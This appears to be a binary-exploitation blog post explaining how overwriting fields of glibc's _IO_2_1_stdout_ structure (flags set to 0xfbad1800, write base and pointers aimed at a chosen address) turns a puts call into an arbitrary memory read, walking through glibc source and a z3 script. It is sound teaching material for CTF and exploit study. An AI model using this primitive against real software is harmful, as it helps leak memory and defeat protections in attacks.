---
layout: page
title: Arbitrary Address Read via _IO_2_1_stdout_
css: "/assets/css/modeOne.css"
readtime: true
comments: true
tags: [stdout,_IO_2_1_stdout_,heap,arbitrary read,pwn,binary exploitation]
---

Overwriting various fields of `_IO_2_1_stdout_` carefully and then calling puts can provide a powerful arbitrary memory read primitive. Let's see the mechanism behind it.

First of all, let's try to find out what happens when `puts` is called . `puts` internally calls `_IO_new_file_xsputn` which calls `_IO_OVERFLOW`.

Some important Macros:
```c
#define _IO_NO_WRITES 0x0008
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING 0x1000
```
`_IO_OVERFLOW` is defined as `_IO_new_file_overflow`

```c
int _IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      // ignore the code here
    // ... ... ...
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base);
```

Setting the last byte of `_flags` to 0x00 sets `f->_flags & _IO_NO_WRITES` to 0 which skips the first `if` condition. After that we need to set `f->_flags & _IO_CURRENTLY_PUTTING` and `_IO_write_base` to a non zero value which skips the second `if` condition and subsequently calls `_IO_do_write`

`_IO_do_write` is a macro for `_IO_new_do_write`

```c
int _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
      || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
    return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do); // our aim
  
  // ignore the remaining code
  // .....................
  return count;
}
```
We need to bypass the `else if` block in order to hit `_IO_SYSWRITE` which executes the `write` system call.
For that, we need to set `fp->_flags & _IO_IS_APPENDING` to a non-zero value.

Now, let's do some calculations in order to find the appropriate value for `stdout->_flags`

```py
#!/usr/bin/env python3
from z3 import *
s = Solver()

_IO_NO_WRITES = 0x0008
_IO_CURRENTLY_PUTTING = 0x0800
_IO_IS_APPENDING = 0x1000
_flags = 0xfbad0000

x = BitVec('x',64)
s.add(x>_flags)
s.add(x & _IO_NO_WRITES == 0)
s.add(x & _IO_CURRENTLY_PUTTING != 0)
s.add(x & _IO_IS_APPENDING !=0 )
s.check()
m = s.model()
answer = str(m[m[0]])
print(hex(int(answer)))
```
This gives us the value `0xfbad1800` for `_flags`. 

The final setup that is needed for arbitrary address read is:

```c
_IO_2_1_stdout->file->_flags = 0xfbad1800 ;
_IO_2_1_stdout->file->_IO_read_ptr = 0x0 ;
_IO_2_1_stdout->file->_IO_read_end = 0x0;
_IO_2_1_stdout->file->_IO_read_base = 0x0;
_IO_2_1_stdout->file->_IO_write_base = some_address; // the address from where you want to leak data
_IO_2_1_stdout->file->_IO_write_ptr = some_address+offset; // offset to control the amount of data leaked
_IO_2_1_stdout->file->_IO_write_end = some_address+offset;
```
The next call to puts will leak `offset` bytes of data from `some_address`. 